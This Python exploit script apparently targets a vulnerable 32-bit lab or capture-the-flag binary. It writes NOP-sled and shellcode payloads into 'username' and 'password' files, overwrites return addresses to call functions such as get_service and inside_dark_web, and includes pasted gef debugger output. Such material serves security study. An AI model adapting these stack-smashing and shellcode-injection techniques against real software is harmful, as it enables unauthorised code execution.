#!/usr/bin/python3
import sys 

def p32(x):
    return x.to_bytes(4, "little")

PARAM_1 = 30
PARAM_2 = 50
PARAM_3 = 400

shellcode= (
"\x31\xC0\x40\x40\x40\x40\x50\xB8\x88\x80\x08\x08\x50\xBB\x8D\x62\x55\x56\xFF\xD3"
).encode('latin-1') 
 
# total_ln = 74
# NOPs = 0x0
# # Fill the content with NOPs 
# content = bytearray(0x90 for i in range(total_ln)) 
# # Put the shellcode at the end 
# # start = total_ln - len(shellcode) 
# # content[start:] = shellcode 
 
# # Put the address at offset 112 
# ret = 0x56556315 + NOPs 
# content[70:74] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('username', 'wb') as f: 
    f.write(
        b"\x90" * 70 + p32(0x56556315) + b"\x00"
    ) 

total_ln = PARAM_3
distance = 42

print(len(shellcode))
content = bytearray(0x90 for i in range(total_ln))

start = total_ln - len(shellcode) 
content[start:] = shellcode

NOPs = 0x20

func = 0xffffcfca + NOPs

content[distance:distance+4] = func.to_bytes(4,byteorder='little') 


with open('password', 'wb') as f: 
    f.write(content)

"""

gef➤  p get_service
$3 = {void (char *, char *)} 0x56556315 <get_service>
gef➤  p inside_dark_web
$4 = {void (int, int)} 0x5655628d <inside_dark_web>

0xffffca40:     0x5655a6f0      0xf7fb3000      0xffffca88      0xf7e35b67
0xffffca50:     0x5655a6f0      0xffffd0e8      0x00000190      0x00000001
0xffffca60:     0x56558fc0      0xf7fb3000

x/10x $esp

0xffffd908
0xffffd0f8

"""

with open("username", "wb") as f:
    f.write(b'A' * 70 + b'\x18\x63\x55\x56' + b'A' * 4 + b'\xd8\xd0\xff\xff' * 2 + b'\x00')

with open("password", "wb") as f:
    f.write(b'A' * 42 + b'\x8d\x62\x55\x56' + b'A' * 4 + (134774920).to_bytes(4, "little") +(134774920).to_bytes(4, "little") + b'\x00')